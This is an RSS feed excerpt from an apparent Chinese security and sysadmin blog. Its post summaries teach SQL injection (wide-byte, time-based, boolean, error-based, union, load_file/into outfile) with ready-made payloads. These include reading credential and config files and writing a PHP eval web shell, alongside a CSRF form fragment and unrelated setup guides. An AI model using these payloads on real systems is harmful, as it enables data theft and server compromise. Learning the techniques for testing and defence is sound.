action=&amp;quot;http://172.23.10.200/setpasswd.php&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt; 昵称：&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;nickname&amp;quot; id=&amp;quot;nickname&amp;quot; value=&amp;quot;xxxxx&amp;quot;&amp;gt; 用户名：&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;name&amp;quot; id=&amp;quot;name&amp;quot; value=&amp;quot;xiaoming&amp;quot;&amp;gt; 密码：&amp;lt;input type=&amp;quot;passwd&amp;quot; name=&amp;quot;passwd&amp;quot; id=&amp;quot;passwd&amp;quot; value=&amp;quot;&amp;quot;&amp;gt; 确认密码：&amp;lt;input type=&amp;quot;rpasswd&amp;quot; name=&amp;quot;rpasswd&amp;quot; id=&amp;quot;rpasswd&amp;quot; value=&amp;quot;&amp;quot;&amp;gt; &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;button&amp;quot; value=&amp;quot;提交&amp;quot;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;  此时我们就可以构造自动提交表单的xxxx.</description>
    </item>
    
    <item>
      <title>Python的logging模块</title>
      <link>http://wyb0.com/posts/2016/python-module-logging/</link>
      <pubDate>Mon, 27 Jun 2016 08:55:30 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-module-logging/</guid>
      <description>0x00 使用流程  创建一个logger 创建一个handler，用于写入日志文件 定义handler的输出格式 将handler添加到logger 记录日志  0x01 示例 #!/usr/bin/env python # -*- coding: utf-8 -*- import logging class MyLog(object): &amp;quot;&amp;quot;&amp;quot;docstring for MyLog&amp;quot;&amp;quot;&amp;quot; def __init__(self, logfile, loglevel, logger): super(MyLog, self).__init__() # 创建一个logger self.logger = logging.getLogger(logger) self.logger.setLevel(logging.DEBUG) # 创建一个用于写入日志文件的handler fh = logging.FileHandler(logfile) fh.setLevel(logging.DEBUG) # 只要是写入文件的等级都为DEBUG，也可以设置为loglevel formatterf = logging.Formatter(&#39;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#39;) fh.setFormatter(formatterf) # 创建一个用于输出到控制台的handler ch = logging.StreamHandler() ch.setLevel(loglevel) formatterc = logging.Formatter(&#39;%(asctime)s - %(message)s&#39;) ch.setFormatter(formatterc) # 将handler添加到logger self.</description>
    </item>
    
    <item>
      <title>SQL注入之防御</title>
      <link>http://wyb0.com/posts/2016/injection-of-defense/</link>
      <pubDate>Sat, 25 Jun 2016 10:25:11 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/injection-of-defense/</guid>
      <description>0x00 要做的事 也就是找到注入点然后修复
0x01 防御方法  使用预编译语句绑定变量(比如php的mysqli、pdo)
&amp;lt;?php //预编译 $mysqli = new mysqli(&amp;quot;localhost&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;123456&amp;quot;,&amp;quot;share&amp;quot;); $mysqli-&amp;gt;query(&amp;quot;set names utf8&amp;quot;); $sql = &amp;quot;INSERT INTO test (name,sex,age) VALUE(?,?,?)&amp;quot;; $s = $mysqli-&amp;gt;prepare($sql); //绑定参数 $name = &amp;quot;Tom&amp;quot;; $sex = &amp;quot;M&amp;quot;; $age = 23; $s-&amp;gt;bind_param(&amp;quot;ssi&amp;quot;,$name,$sex,$age);//ssi的意思是字符、字符、整型 //执行 $result = $s-&amp;gt;execute(); var_dump($result); $s-&amp;gt;close(); ?&amp;gt;  使用存储过程(这里以SQLServer举例)
  --如果存在名为get_student_msg(相当于函数)的存储过程则删除 IF EXISTS (SELECT name FROM sysobjects WHERE name=&#39;get_student_msg&#39; AND type=&#39;p&#39;) DROP PROCEDURE get_student_msg CREATE PROCEDURE get_student_msg --创建存储过程 @name VARCHAR(20) --声明全局变量 AS BEGIN SELECT * from info WHERE name=@name END GO --创建好存储过程后在其他地方直接使用函数并传参就行了 EXEC get_student_msg &#39;xiaoli&#39;   使用转义函数</description>
    </item>
    
    <item>
      <title>SQL注入之宽字节注入(MySQL)</title>
      <link>http://wyb0.com/posts/2016/injection-of-wide-byte/</link>
      <pubDate>Fri, 24 Jun 2016 15:32:34 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/injection-of-wide-byte/</guid>
      <description>0x00 应用场景 在注入时通常会使用单引号、双引号等特殊字符。在应用中，通常为了安全，开发者会开启php的magic_quotes_gpc，或者使用addslashes、mysql_real_escape_string等函数对客户端传入的参数进行过滤，则注入的单引号或双引号就会被&amp;quot;\&amp;quot;转义，但是，如果服务端的数据库使用的是GB2312、GBK、GB18030等宽字节的编码时，则依然会造成注入。
0x01 测试代码 &amp;lt;?php $conn = mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;); mysql_select_db(&#39;messages&#39;,$conn); if (isset($_GET[&#39;id&#39;])) { $id = addslashes($_GET[&#39;id&#39;]); //转义id $sql = &amp;quot;select * from msg where id=&#39;$id&#39;;&amp;quot;; echo $sql.&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; $result = mysql_query($sql); $rows = @mysql_fetch_assoc($result); if ($rows) { echo &#39;&amp;lt;table align=&amp;quot;left&amp;quot; border=&amp;quot;1&amp;quot;&amp;gt;&#39;; foreach ($rows as $key =&amp;gt; $value) { echo &#39;&amp;lt;tr align=&amp;quot;lift&amp;quot; height=&amp;quot;30&amp;quot;&amp;gt;&#39;; echo &#39;&amp;lt;td&amp;gt;&#39;.$key.&#39;----&#39;.$value.&#39;&amp;lt;/td&amp;gt;&#39;; echo &#39;&amp;lt;/tr&amp;gt;&#39;; } echo &#39;&amp;lt;/table&amp;gt;&#39;; } else { echo mysql_error(); } } else { echo &amp;quot;please input id.</description>
    </item>
    
    <item>
      <title>SQL注入之基于时间的注入(MySQL)</title>
      <link>http://wyb0.com/posts/2016/injection-of-time-based/</link>
      <pubDate>Fri, 24 Jun 2016 10:10:27 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/injection-of-time-based/</guid>
      <description>0x00 特点 当页面存在注入，但是没有显示位且不管怎么测试返回页面都没有变化，此时可以使用基于时间的盲注进行注入。 其实只要存在SQL注入就可以使用基于时间的盲注，利用范围比较广泛，但是可能受到网络带宽等因素的影响。  0x01 利用方式 整型注入的话可以直接: ?id=if(1=1,sleep(2),1) 字符型的话需要闭合: ?id=2&#39; and if(1=1,sleep(2),1) and &#39;1  0x02 相关函数  if(条件, 值1, 值2)
当条件为真时返回值1，条件为假时返回值2
 sleep()
sleep(2)睡眠两秒
 benchmark(count, expr)
benchmark是用于测试函数性能的，它是将表达式expr执行count次，执行次数越多耗费时间越久
  0x03 基于时间的注入payload mysql&amp;gt; select if((select database()) like &amp;quot;rte%&amp;quot;,sleep(2),666); +---------------------------------------------------+ | if((select database()) like &amp;quot;rte%&amp;quot;,sleep(2),666) | +---------------------------------------------------+ | 0 | +---------------------------------------------------+ 1 row in set (2.00 sec) mysql&amp;gt; select if((select database())=&amp;quot;rteaaa&amp;quot;,sleep(2),666); +-----------------------------------------------+ | if((select database())=&amp;quot;rtest1&amp;quot;,sleep(2),666) | +-----------------------------------------------+ | 666 | +-----------------------------------------------+ 1 row in set (0.</description>
    </item>
    
    <item>
      <title>SQL注入之布尔型注入(MySQL)</title>
      <link>http://wyb0.com/posts/2016/injection-of-boolian-based/</link>
      <pubDate>Thu, 23 Jun 2016 23:32:34 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/injection-of-boolian-based/</guid>
      <description>0x00 特点 当页面存在注入，但是没有显示位，且没有用echo &amp;quot;mysql_error()&amp;quot;输出错误信息时可以用， 它一次只能猜测一个字节，速度慢，但是只要存在注入就能用  0x01 利用方式 用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) --+ 根据返回页面是否相同来得到数据  0x02 注入步骤  找到注入点，判断闭合字符  尝试猜解列数，得到显示位  得到数据库名 最终得到第五个数据库名为security
 得到表名 最终依次猜的表名为users
 得到列名 同理最终得到第2列列名为username，第3列列名为password
 得到列值 依次得到为admin4，同理可得其他数据
  0x04 附上python脚本 #!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber &amp;lt;1070018473@qq.com&amp;gt; __author__=&amp;quot;reber&amp;quot; import sys import requests import binascii import hashlib from pyfiglet import figlet_format from optparse import OptionParser def get_md5_html(url): html = requests.</description>
    </item>
    
    <item>
      <title>SQL注入之报错型注入(MySQL)</title>
      <link>http://wyb0.com/posts/2016/injection-of-error-based/</link>
      <pubDate>Wed, 22 Jun 2016 15:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/injection-of-error-based/</guid>
      <description>0x00 前提 一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用， 它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解  0x01 利用方式 报错注入只要套用公式即可，如下(第一个公式count(*)、floor()、rand()、group by不可或缺，后两个公式有32位的限制):
?id=2&amp;rsquo; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a )--+
?id=2&amp;rsquo; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--+
?id=1&amp;rsquo; and extractvalue(1, concat(0x7e, (select @@version),0x7e))--+
第一个公式具体原理可以参考：MySQL报错注入原理分析(count()、rand()、group by)
0x02 公式解析 floor()是取整数 rand()在0和1之间产生一个随机数 rand(0)*2将取0到2的随机数 floor(rand()*2)有两条记录就会报错 floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的 count(*)是用来统计结果的，相当于刷新一次结果 group by对数据分组时会先看看虚拟表里有没有这个值,若没有就插入,若存在则count(*)加1 group by时floor(rand(0)*2)会被执行一次,若虚表不存在记录,插入虚表时会再执行一次  0x03 注入步骤  猜测闭合字符  猜测列数  尝试得到显示位  报错得到数据库个数  报错得到数据库名  报错得到表名  报错得到列名  得到列值   0x04 附上利用代码 #!</description>
    </item>
    
    <item>
      <title>SQL注入之联合查询(MySQL)</title>
      <link>http://wyb0.com/posts/2016/injection-of-union-select/</link>
      <pubDate>Tue, 21 Jun 2016 22:30:18 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/injection-of-union-select/</guid>
      <description> 0x00 前提 要用联合查询进行注入则：页面必须有显示位
0x01 联合查询 union可合并两个或多个select语句的结果集，前提是两个select必有相同列、且各列的数据类型也相同
0x02 注入步骤  找到注入点得到闭合字符  判断数据库类型  猜解列数，得到显示位(从数据库中查询出来的数据有些会显示在页面中，显示的位置就是显示位)  得到基本信息(数据库名、版本、数据库版本等)  得到数据库  得到security数据库的表名  猜解列名  猜解数据   </description>
    </item>
    
    <item>
      <title>SQL注入之load_file和into outfile(MySQL)</title>
      <link>http://wyb0.com/posts/2016/injection-of-mysql-function/</link>
      <pubDate>Mon, 20 Jun 2016 08:10:27 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/injection-of-mysql-function/</guid>
      <description>0x00 load_file()  条件:  1. 要有file_priv权限 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若过滤了单引号，则可以将函数中的字符进行hex编码   一般步骤
 读/etc/init.d下的东西，这里有配置文件路径
?id=1&#39; union select 1,2,load_file(&#39;/etc/init.d/httpd&#39;)  得到web安装路径
?id=1&#39; union select 1,2,load_file(&#39;/etc/apache/conf/httpd.conf&#39;)  读取密码文件
?id=1&#39; union select 1,2,load_file(&#39;/site/xxx.com/conf/conn.inc.php&#39;)    0x01 into outfile  条件：  1. 要有file_priv权限 2. 知道网站绝对路径 3. 要能用union 4. 对web目录有写权限 5. 没有过滤单引号   一般方法
当知道路径时，可以直接用?id=1 union select &amp;ldquo;&amp;lt;?php @eval($_POST[&amp;lsquo;c&amp;rsquo;]);?&amp;gt;&amp;rdquo; into outfile(&amp;ldquo;C:/phpStudy/WWW/a.php&amp;rdquo;)
 其他方法
 登陆phpMyAdmin
use test; 选择数据库为test create table aaa(bbb varchar(64)); 在数据库中创建一个表aaa insert into aaa values(&amp;quot;&amp;lt;?</description>
    </item>
    
    <item>
      <title>SQL注入</title>
      <link>http://wyb0.com/posts/2016/injection/</link>
      <pubDate>Sun, 19 Jun 2016 20:18:48 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/injection/</guid>
      <description>0x00 含义 sql注入是将代码插入(拼接)到应用(用户)的输入参数中，之后再将这些参数传递给后台的SQL服务器加以解析并执行的攻击，
总结起来就是攻击者将恶意代码拼接到sql语句并加以执行从而得到数据的过程。
0x01 成因 SQl语句未对用户参数进行严格过滤
0x02 可引发注入的地方 其实只要是客户端可控、参数值代入数据库查询的地方都可能存在注入，常见的如下，按出现频率排序：
 GET POST X-Forwarded-For Cookie User-Agent  0x03 注入分类  根据语法(较权威)
 UNION query SQL injection(可联合查询注入)
只要页面有显示位即可使用，且注入速度很快 Error-based SQL injection(报错型注入)
没有显示位但用echo &amp;ldquo;mysql_error()&amp;ldquo;输出了错误信息，速度很快，但是语句较复杂 Boolean-based blind SQL injection(布尔型注入)
一次一个字节，速度慢，但只要有注入就能用 Time-based blind SQL injection(基于时间延迟注入)
超级慢，比布尔型注入慢几倍，但是通用性较强 Stacked queries SQL injection(堆叠注入)
只有SQL Server可以使用(可多语句查询注入)  根据类型
 整形
形如&amp;quot;a.asp?ID=55&amp;quot;，这类注入的参数是&amp;rdquo;数字&amp;rdquo;，因此称为&amp;rdquo;数字型注入点&amp;rdquo;。 字符串型
形如&amp;quot;b.asp?name=xiaoming&amp;quot;这类注入的参数是&amp;rdquo;字符&amp;rdquo;，称为&amp;rdquo;字符型&amp;rdquo;注入点。
 搜索型
指在进行数据搜索时没过滤搜索参数，直接通过搜索框表单提交。
   0x04 查找注入点  在URL中
 and 1=1/and 1=2(整型) 随即输入(整型) -1/+1 回显上下页面(整型) 单引号(字符型/整型) and sleep(5) (判断页面返回时间)  在http头</description>
    </item>
    
    <item>
      <title>MySQL的information_schema库</title>
      <link>http://wyb0.com/posts/2016/mysql-database-table-information_schema/</link>
      <pubDate>Sun, 19 Jun 2016 19:40:25 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/mysql-database-table-information_schema/</guid>
      <description> 0x00 information_schema information_schema这个数据库中保存了MySQL服务器所有数据库的信息。 如数据库名，数据库的表，表栏的数据类型与访问权限等。 再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表， 每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。 information_schema的表schemata中的列schema_name记录了所有数据库的名字 information_schema的表tables中的列table_schema记录了所有数据库的名字 information_schema的表tables中的列table_name记录了所有数据库的表的名字 information_schema的表columns中的列table_schema记录了所有数据库的名字 information_schema的表columns中的列table_name记录了所有数据库的表的名字 information_schema的表columns中的列column_name记录了所有数据库的表的列的名字  0x01 information_schema的SCHEMATA表 0x02 information_schema的TABLES表 0x03 information_schema的COLUMNS表 </description>
    </item>
    
    <item>
      <title>渗透测试流程(单台服务器)</title>
      <link>http://wyb0.com/posts/2016/pentest-process/</link>
      <pubDate>Sun, 19 Jun 2016 19:31:33 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/pentest-process/</guid>
      <description> 针对单台服务器的渗透流程 </description>
    </item>
    
    <item>
      <title>Windows2003下搭建IIS&#43;asp</title>
      <link>http://wyb0.com/posts/2016/windows2003-set-up-iis-asp/</link>
      <pubDate>Sat, 18 Jun 2016 20:39:50 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/windows2003-set-up-iis-asp/</guid>
      <description> 0x00 添加组件 0x01 开启iis 0x02 添加Web服务扩展 0x03 运行asp 0x04 权限 </description>
    </item>
    
    <item>
      <title>Linux下搭建FTP</title>
      <link>http://wyb0.com/posts/2016/linux-set-up-ftp/</link>
      <pubDate>Sat, 18 Jun 2016 09:40:06 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/linux-set-up-ftp/</guid>
      <description>安装环境为：CentOS-6.5-x86_64-minimal
0x00 安装 yum install vsftpd
0x01 配置  备份
cp /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf.bak
 编辑配置文件
vim /etc/vsftpd/vsftpd.conf anonymous_enable=NO #设定不允许匿名访问 local_enable=YES #设定本地用户可以访问 chroot_list_enable=YES #使用户不能离开主目录 xferlog_file=/var/log/vsftpd.log #设定vsftpd的服务日志 ascii_upload_enable=YES ascii_download_enable=YES #设定支持ASCII pam_service_name=vsftpd #PAM认证文件名,PAM将根据/etc/pam.d/vsftpd进行认证 # 并在尾部追加： guest_enable=YES #设定启用虚拟用户功能。 guest_username=ftp #指定虚拟用户的宿主用户。-CentOS中已经有内置的ftp用户了 guest_config_dir=/etc/vsftpd/vuser_conf #设定虚拟用户个人vsftp的配置文件存放路径。存放虚拟用户个性化的配置文件名，和虚拟用户名相同  新增chroot_list并将ftp用户输入进去
touch /etc/vsftpd/chroot_list
echo ftp &amp;gt;&amp;gt; /etc/vsftpd/chroot_list
 安装Berkeley DB工具用来对虚拟用户认证配置管理：
yum install db4 db4-utils
 创建用户账户文件
vim /etc/vsftpd/vuser_passwd.txt user1 #奇数行是用户名 123456 #偶数行是密码 user2 #奇数行是用户名 666666 #偶数行是密码 user3 #奇数行是用户名 user3 #偶数行是密码  用Berkeley DB工具生成认证文件</description>
    </item>
    
    <item>
      <title>Linux下搭建Tomcat&#43;MySQL&#43;JSP</title>
      <link>http://wyb0.com/posts/2016/linux-set-up-tomcat-mysql-jsp/</link>
      <pubDate>Fri, 17 Jun 2016 23:08:05 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/linux-set-up-tomcat-mysql-jsp/</guid>
      <description>安装环境为：CentOS-6.5-x86_64-minimal
0x00 安装mysql $ sudo yum install mysql mysql-server mysql-devel
0x01 安装jdk和tomcat  创建安装jdk和tomcat的文件夹  下载安装包并解压安装
jdk包可在这里下载
tomcat包可在这里下载 为java添加环境变量并设置命令链接符 ```bash $ tail -n 3 /etc/profile export JAVA_HOME=&amp;ldquo;/opt/jdk1.8.0_91&amp;rdquo; export CLASSPATH=.:$JAVA_HOME/lib export PATH=$JAVA_BIN/bin:$PATH
  $ sudo update-alternatives &amp;ndash;install /usr/bin/java java /opt/jdk1.8.0_91/bin/java 1 $ sudo update-alternatives &amp;ndash;install /usr/bin/javac javac /opt/jdk1.8.0_91/bin/javac 1 $ sudo update-alternatives &amp;ndash;set java /opt/jdk1.8.0_91/bin/java $ sudo update-alternatives &amp;ndash;set javac /opt/jdk1.8.0_91/bin/javac
![验证jdk是否设置成功.png](/img/post/java_version.png) ### 0x02 简单配置tomcat ![简单配置tomcat1.png](/img/post/config_tomcat.png) ### 0x03 启动tomcat !</description>
    </item>
    
    <item>
      <title>Linux下搭建Nginx&#43;MySQL&#43;PHP</title>
      <link>http://wyb0.com/posts/2016/linux-set-up-nginx-mysql-php/</link>
      <pubDate>Fri, 17 Jun 2016 22:41:50 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/linux-set-up-nginx-mysql-php/</guid>
      <description>安装环境为：CentOS-6.5-x86_64-minimal
0x00 准备工作 首先执行： sudo yum groupinstall &amp;quot;Development tools&amp;quot; 安装make： yum -y install gcc automake autoconf libtool make 安装g++： yum install gcc gcc-c++  0x01 安装mysql和php sudo yum install mysql mysql-server mysql-devel sudo yum install php php-devel sudo yum install php-gd php-mysql php-fpm  0x02 安装依赖  安装pcre、pcre-devel
sudo yum install pcre pcre-devel
 安装zlib、zlib-devel
sudo yum install zlib zlib-devel
 安装ssl
sudo yum install openssl openssl-devel
  0x03 安装Nginx 可在http://nginx.</description>
    </item>
    
    <item>
      <title>Python第三方模块的安装</title>
      <link>http://wyb0.com/posts/2016/python-install-third-party-modules/</link>
      <pubDate>Wed, 15 Jun 2016 13:08:00 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-install-third-party-modules/</guid>
      <description>0x00 第三方模块安装方法  使用工具easy_install 使用工具pip(easy_install的升级版，还不能完全取代) 直接在https://pypi.python.org/pypi 下载安装  0x01 使用easy_install安装 在https://bootstrap.pypa.ip/ez_setup.py 下载安装脚本 然后执行python ez_setup.py即可安装easy_install 安装：easy_install PackageName 升级：easy_install -U PackageName  0x02 使用pip安装 在https://bootstrap.pypa.io/get-pip.py 下载安装脚本 然后执行python get-pip.py即可安装pip 安装：pip install PackageName 升级：pip install --upgrade PackageName 删除：pip uninstall PackageName  0x03 网站下载安装包 在https://pypi.python.org/pypi 直接下载相应的exe或者py文件安装</description>
    </item>
    
    <item>
      <title>Ubuntu下使用ShadowSocks</title>
      <link>http://wyb0.com/posts/2016/ubuntu-use-shadowsocks/</link>
      <pubDate>Mon, 13 Jun 2016 09:14:45 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/ubuntu-use-shadowsocks/</guid>
      <description> 环境：Ubuntu14.04
0x00 安装shadowsocks-qt5 sudo apt-get update sudo apt-get python-software-properties software-properties-common sudo add-apt-repository ppa:hzwhuang/ss-qt5（添加源） sudo apt-get update （更新你的软件库） sudo apt-get install shadowsocks-qt5 (正式安装)  0x01 配置客户端 0x02 配置火狐 0x03 访问YouTube </description>
    </item>
    
    <item>
      <title>Python编写规范</title>
      <link>http://wyb0.com/posts/2016/python-coding-style/</link>
      <pubDate>Sun, 12 Jun 2016 22:17:35 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-coding-style/</guid>
      <description>0x00 代码编排 1.缩进：使用4个空格缩进 2.行长度：每行不要超过80个字符 3.空行：顶级定义之间空两行，如函数或类的定义，方法定义、类定义与第一个方法之间都应该空一行。 4.分号：行尾不要有分号，也不要用分号将两条命令放在一行,除非是： 1.长的导入模块语句。 2.注释里的URL. 3.可以使用圆括号实现隐式行连接  0x01文档编排 1.导入：模块注释-&amp;gt;文档字符串-&amp;gt;导入-&amp;gt;模块全局变量-&amp;gt;常量 导入顺序：标准库导入-&amp;gt;第三方库导入-&amp;gt;应用程序指定库导入 2.import:不要在一行中import多个库，一行中只导入一个  0x02 空格 1.不要在逗号、分号、冒号前加空格，但应在他们后面加(除了在行尾) 2.二元操作符(赋值、比较、布尔)两边都加空格 3.当&amp;quot;=&amp;quot;用于指示关键字参数或默认参数值是，不要再其两侧使用空格 4.&amp;quot;,&amp;quot;和&amp;quot;#&amp;quot;和&amp;quot;=&amp;quot;不需要对齐，因为空格会成为维护的负担  0x03 注释 总体原则，错误的注释不如没有注释。 注释必须使用英文，最好是完整的句子，首字母大写，句后要有结束符，结束符后跟两个空格，开始下一句。如果是短语，可以省略结束符。 1.块注释：在一段代码前增加的注释。在&amp;quot;#&amp;quot;后加一空格。段落之间以只有&amp;quot;#&amp;quot;的行间隔。 2.行注释，在一句代码后加注释。进来少使用. 3.绝不要描述代码. 假设阅读代码的人比你更懂Python, 他只是不知道你的代码要做什么.  0x04 文档描述 1.为所有的共有模块、函数、类、方法写docstrings；非共有的没有必要，但是可以写注释（在def的下一行）。 2.如果docstring要换行，参考如下例子 class SampleClass(object): &amp;quot;&amp;quot;&amp;quot;Summary of class here. Longer class information.... Longer class information.... Attributes: likes_spam: A boolean indicating if we like SPAM or not. eggs: An integer count of the eggs we have laid. &amp;quot;&amp;quot;&amp;quot; def __init__(self): &amp;quot;&amp;quot;&amp;quot;Inits SampleClass with blah.</description>
    </item>
    
    <item>
      <title>conky配置</title>
      <link>http://wyb0.com/posts/2016/conky-configuration/</link>
      <pubDate>Sat, 04 Jun 2016 20:26:21 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/conky-configuration/</guid>
      <description>0x00 效果 使用软件conky可以在linux上看到系统的运行状态，效果如下： 0x01 安装与配置  先安装conky：
sudo apt-get install conky
 在/home/username/下创建文件.conkyrc
 使conky开机自启
在/etc/profile最下面添加：/usr/bin/conky &amp;amp;
  0x03 配置文件.conkyrc内容如下 # set to yes if you want Conky to be forked in the background background no cpu_avg_samples 2 net_avg_samples 2 out_to_console no # X font when Xft is disabled, you can pick one with program xfontsel #font 7x12 #font 6x10 #font 7x13 #font 8x13 #font 7x12 #font *mintsmild.se* #font -*-*-*-*-*-*-34-*-*-*-*-*-*-* #font -artwiz-snap-normal-r-normal-*-*-100-*-*-p-*-iso8859-1 # Use Xft?</description>
    </item>
    
    <item>
      <title>RGB颜色对照表</title>
      <link>http://wyb0.com/posts/2016/rgb-color-look-up-table/</link>
      <pubDate>Sat, 04 Jun 2016 20:03:10 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/rgb-color-look-up-table/</guid>
      <description>RGB    RGB颜色对照表
    #FFFFFF  #FFFFF0  #FFFFE0  #FFFF00    #FFFAFA  #FFFAF0  #FFFACD  #FFF8DC    #FFF68F  #FFF5EE  #FFF0F5  #FFEFDB    #FFEFD5  #FFEC8B  #FFEBCD  #FFE7BA    #FFE4E1  #FFE4C4  #FFE4B5  #FFE1FF    #FFDEAD  #FFDAB9  #FFD700  #FFD39B    #FFC1C1  #FFC125  #FFC0CB  #FFBBFF    #FFB90F  #FFB6C1  #FFB5C5  #FFAEB9    #FFA54F  #FFA500  #FFA07A  #FF8C69    #FF8C00  #FF83FA  #FF82AB  #FF8247    #FF7F50  #FF7F24  #FF7F00  #FF7256    #FF6EB4  #FF6A6A  #FF69B4  #FF6347    #FF4500  #FF4040  #FF3E96  #FF34B3    #FF3030  #FF1493  #FF00FF  #FF0000    #FDF5E6  #FCFCFC  #FAFAFA  #FAFAD2    #FAF0E6  #FAEBD7  #FA8072  #F8F8FF    #F7F7F7  #F5FFFA  #F5F5F5  #F5F5DC    #F5DEB3  #F4F4F4  #F4A460  #F2F2F2    #F0FFFF  #F0FFF0  #F0F8FF  #F0F0F0    #F0E68C  #F08080  #EEEEE0  #EEEED1    #EEEE00  #EEE9E9  #EEE9BF  #EEE8CD    #EEE8AA  #EEE685  #EEE5DE  #EEE0E5    #EEDFCC  #EEDC82  #EED8AE  #EED5D2    #EED5B7  #EED2EE  #EECFA1  #EECBAD    #EEC900  #EEC591  #EEB4B4  #EEB422    #EEAEEE  #EEAD0E  #EEA9B8  #EEA2AD    #EE9A49  #EE9A00  #EE9572  #EE82EE    #EE8262  #EE7AE9  #EE799F  #EE7942    #EE7621  #EE7600  #EE6AA7  #EE6A50    #EE6363  #EE5C42  #EE4000  #EE3B3B    #EE3A8C  #EE30A7  #EE2C2C  #EE1289    #EE00EE  #EE0000  #EDEDED  #EBEBEB    #EAEAEA  #E9967A  #E8E8E8  #E6E6FA    #E5E5E5  #E3E3E3  #E0FFFF  #E0EEEE    #E0EEE0  #E0E0E0  #E066FF  #DEDEDE    #DEB887  #DDA0DD  #DCDCDC  #DC143C    #DBDBDB  #DB7093  #DAA520  #DA70D6    #D9D9D9  #D8BFD8  #D6D6D6  #D4D4D4    #D3D3D3  #D2B48C  #D2691E  #D1EEEE    #D1D1D1  #D15FEE  #D02090  #CFCFCF    #CDCDC1  #CDCDB4  #CDCD00  #CDC9C9    #CDC9A5  #CDC8B1  #CDC673  #CDC5BF    #CDC1C5  #CDC0B0  #CDBE70  #CDBA96    #CDB7B5  #CDB79E  #CDB5CD  #CDB38B    #CDAF95  #CDAD00  #CDAA7D  #CD9B9B    #CD9B1D  #CD96CD  #CD950C  #CD919E    #CD8C95  #CD853F  #CD8500  #CD8162    #CD7054  #CD69C9  #CD6889  #CD6839    #CD661D  #CD6600  #CD6090  #CD5C5C    #CD5B45  #CD5555  #CD4F39  #CD3700    #CD3333  #CD3278  #CD2990  #CD2626    #CD1076  #CD00CD  #CD0000  #CCCCCC    #CAFF70  #CAE1FF  #C9C9C9  #C7C7C7    #C71585  #C6E2FF  #C67171  #C5C1AA    #C4C4C4  #C2C2C2  #C1FFC1  #C1CDCD    #C1CDC1  #C1C1C1  #C0FF3E  #BFEFFF    #BFBFBF  #BF3EFF  #BEBEBE  #BDBDBD    #BDB76B  #BCEE68  #BCD2EE  #BC8F8F    #BBFFFF  #BABABA  #BA55D3  #B9D3EE    #B8B8B8  #B8860B  #B7B7B7  #B5B5B5    #B4EEB4  #B4CDCD  #B452CD  #B3EE3A    #B3B3B3  #B2DFEE  #B23AEE  #B22222    #B0E2FF  #B0E0E6  #B0C4DE  #B0B0B0    #B03060  #AEEEEE  #ADFF2F  #ADD8E6    #ADADAD  #ABABAB  #AB82FF  #AAAAAA    #A9A9A9  #A8A8A8  #A6A6A6  #A52A2A    #A4D3EE  #A3A3A3  #A2CD5A  #A2B5CD    #A1A1A1  #A0522D  #A020F0  #9FB6CD    #9F79EE  #9E9E9E  #9C9C9C  #9BCD9B    #9B30FF  #9AFF9A  #9ACD32  #9AC0CD    #9A32CD  #999999  #9932CC  #98FB98    #98F5FF  #97FFFF  #96CDCD  #969696    #949494  #9400D3  #9370DB  #919191    #912CEE  #90EE90  #8FBC8F  #8F8F8F    #8EE5EE  #8E8E8E  #8E8E38  #8E388E    #8DEEEE  #8DB6CD  #8C8C8C  #8B8B83    #8B8B7A  #8B8B00  #8B8989  #8B8970    #8B8878  #8B8682  #8B864E  #8B8386    #8B8378  #8B814C  #8B7E66  #8B7D7B    #8B7D6B  #8B7B8B  #8B795E  #8B7765    #8B7500  #8B7355  #8B6969  #8B6914    #8B668B  #8B6508  #8B636C  #8B5F65    #8B5A2B  #8B5A00  #8B5742  #8B4C39    #8B4789  #8B475D  #8B4726  #8B4513    #8B4500  #8B3E2F  #8B3A62  #8B3A3A    #8B3626  #8B2500  #8B2323  #8B2252    #8B1C62  #8B1A1A  #8B0A50  #8B008B    #8B0000  #8A8A8A  #8A2BE2  #8968CD    #87CEFF  #87CEFA  #87CEEB  #878787    #858585  #848484  #8470FF  #838B8B    #838B83  #836FFF  #828282  #7FFFD4    #7FFF00  #7F7F7F  #7EC0EE  #7D9EC0    #7D7D7D  #7D26CD  #7CFC00  #7CCD7C    